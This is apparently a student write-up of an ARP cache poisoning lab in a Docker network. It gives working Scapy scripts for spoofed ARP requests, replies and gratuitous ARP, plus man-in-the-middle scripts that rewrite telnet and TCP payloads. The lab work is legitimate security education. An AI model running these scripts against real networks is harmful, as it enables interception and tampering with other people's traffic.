# Layer 2 - ARP Attacks


## Setup:

No acces to GUI -> Send file from local machine to VM

docker-compose build
docker-compose up
docker ps
![alt text](image.png)

Logging into all three containers

finding out Mac-Adress via: ipconfig
Mac Address and IPs

IP Addresses:
```
A: 10.9.0.5
B: 10.9.0.6
M: 10.9.0.105
``` 

MAC Addresses:
```
A: 02:42:0a:09:00:05
B: 02:42:0a:09:00:06
M: 02:42:0a:09:00:69
```

## Task 1

### Task 1.A (using ARP request)
On host M, construct an ARP request packet to map B’s IP address
to M’s MAC address. Send the packet to A and check whether the attack is successful or not.

#### Script used:
``` python 
#!/usr/bin/env python3
from scapy.all import *
 
E = Ether()
 
E.dst = "02:42:0a:09:00:05" #A MAC address
E.src = "02:42:0a:09:00:69" #M MAC address
 
A = ARP()
A.op    = 1                     # 1 for ARP request; 2 for ARP reply
A.hwsrc = "02:42:0a:09:00:69"   #M MAC address
A.psrc  = "10.9.0.6"            #B IP address
 
A.hwdst = "02:42:0a:09:00:05"   #A MAC address
A.pdst  = "10.9.0.5"            #A IP address
 
pkt = E/A
sendp(pkt)
```
#### Result:
![alt text](image-1.png)

---

### Task 1.B (using ARP reply) 
On host M, construct an ARP reply packet to map B’s IP address to
M’s MAC address. Send the packet to A and check whether the attack is successful or not.
Scenarios
1.  B’s IP is already in A’s cache.
2.  B’s IP is not in A’s cache

#### Script used:
``` python 
#!/usr/bin/env python3
from scapy.all import *
 
E = Ether()
 
E.dst = "02:42:0a:09:00:05" #A MAC address
E.src = "02:42:0a:09:00:69" #M MAC address
 
A = ARP()
A.op    = 2                     # 1 for ARP request; 2 for ARP reply
A.hwsrc = "02:42:0a:09:00:69"   #M MAC address
A.psrc  = "10.9.0.6"            #Spoofed B IP address
 
A.hwdst = "02:42:0a:09:00:05"   #A MAC address
A.pdst  = "10.9.0.5"            #A IP address
 
pkt = E/A
sendp(pkt)
```
#### Results
- Not successful for scenario 1: arp -a returned nothing
- Successful for scenario 2: After pinging Host B and confirming ARP entry, the entry changes after the script execution
![image](https://github.com/user-attachments/assets/29126256-25a2-47eb-8fb4-12fbccecbf84)

---

### Task 1.C (using ARP gratuitous message)
On host M, construct an ARP gratuitous packet, and use
it to map B’s IP address to M’s MAC address. Please launch the attack under the same two scenarios
as those described in Task 1.B.
ARP gratuitous packet is a special ARP request packet. It is used when a host machine needs to
update outdated information on all the other machine’s ARP cache. The gratuitous ARP packet has
the following characteristics:
- The source and destination IP addresses are the same, and they are the IP address of the host
issuing the gratuitous ARP.
- The destination MAC addresses in both ARP header and Ethernet header are the broadcast MAC
address (ff:ff:ff:ff:ff:ff).
- No reply is expected.

#### Script used:
``` python
#!/usr/bin/env python3
from scapy.all import *
 
E = Ether()
 
E.dst = "ff:ff:ff:ff:ff:ff" #Broadcast MAC address
E.src = "02:42:0a:09:00:69" #M MAC address
 
A = ARP()
A.op    = 1                     # 1 for ARP request; 2 for ARP reply
A.hwsrc = "02:42:0a:09:00:69"   #M MAC address
A.psrc  = "10.9.0.6"            #Spoofed B IP address
 
A.hwdst = "ff:ff:ff:ff:ff:ff"   #Broadcast MAC address
A.pdst  = "10.9.0.6"            #B IP address
 
pkt = E/A
sendp(pkt)
```

#### Results:
--> Same as in 1B
- Not successful for scenario 1: arp -a returned nothing
- Successful for scenario 2: After pinging Host B and confirming ARP entry, the entry changes after the script execution
- But: targets multiple hosts
![image](https://github.com/user-attachments/assets/5d218596-2fed-4e14-a281-0bef70d49ac4)

---

## Task 2

### Step 1: Poison the ARP caches

- [x] In A's cache: B's IP address maps to M's MAC address
![image](https://github.com/user-attachments/assets/ee675787-4807-4192-aa70-55a53fc0ea66)

- [x] In B's cache: A's IP address maps to M's MAC address
![image](https://github.com/user-attachments/assets/d8c4bc2e-e9e8-4509-8419-8234ea99fae1)

### Step 2: Test Ping between A and B without IP forwarding on M
#### Result:
- only some icmp packets go through --> inconsistent icmp_seq numbers
- noticable delay between ping responses
![image](https://github.com/user-attachments/assets/58abdd81-3e24-4041-9310-b563404ffcbb)

#### Wireshark:
![image](https://github.com/user-attachments/assets/2e2620ea-6e25-4b15-a682-df74cd5e9625)


### Step 3: Test Ping between A and B with IP forwarding on M
#### Result:
- All icmp packets arrive
- Destination IP address is not the pinged address
- Redirect host message
![image](https://github.com/user-attachments/assets/7cf2f12c-62f2-4fab-9194-ebb6858ab54c)

#### Wireshark
![image](https://github.com/user-attachments/assets/3ca63bdf-b4f3-4161-bba5-3301040a63ac)


### Step 4: Active Man-in-the-middle attack
#### Script used:
``` python
#!/usr/bin/env python3
from scapy.all import *

IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"
IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"

def spoof_pkt(pkt):
    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].payload)
        del(newpkt[TCP].chksum)

        if pkt[TCP].payload:
            data = pkt[TCP].payload.load
            newdata = b"Z" * len(data)
            send(newpkt/newdata)
        else:
            send(newpkt)

    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].chksum)
        send(newpkt)

sniff(filter="tcp and port 23 and not ether src host 02:42:0a:09:00:69", iface="eth0", prn=spoof_pkt)
```
#### Results:
- Every input is replaced by a Z.
- Takes a round trip before actually being displayed
- No screenshot included here, as it only shows Z's

#### Wireshark
- MitM not active yet, IP forwarding on
![image](https://github.com/user-attachments/assets/1a90e621-830b-4aa9-93c2-38e3868114d7)

- MitM not active yet, IP forwarding off
![image](https://github.com/user-attachments/assets/bbccb53a-8b2e-434c-99c1-59b82cbdb405)

- Active MitM, IP forwarding off
![image](https://github.com/user-attachments/assets/e482c851-78cb-44b6-bd72-bf06a07bc70f)

---

## Task 3

#### Script ussed:
```python
#!/usr/bin/env python3
from scapy.all import *

IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"
IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"

names = [b'jan', b'prithvi', b'christopher']

def spoof_pkt(pkt):
    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].payload)
        del(newpkt[TCP].chksum)

        if pkt[TCP].payload:
            newdata = pkt[TCP].payload.load
            for name in names:
                if name in newdata:
                    newdata = newdata.replace(name, b'A' * len(name))
                    print(newdata)
            send(newpkt / newdata)




        else:
            send(newpkt)

    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].chksum)
        send(newpkt)

sniff(filter="tcp and port 9090 and not ether src host 02:42:0a:09:00:69", iface="eth0", prn=spoof_pkt)
```

#### Results

 - our names are all replaced
 
 ![image](https://github.com/user-attachments/assets/78be3da4-4b55-40ff-8a32-49f4ecb1e28a)

 ![image](https://github.com/user-attachments/assets/088893b7-e29c-4a58-940b-73d9bb375ab6)









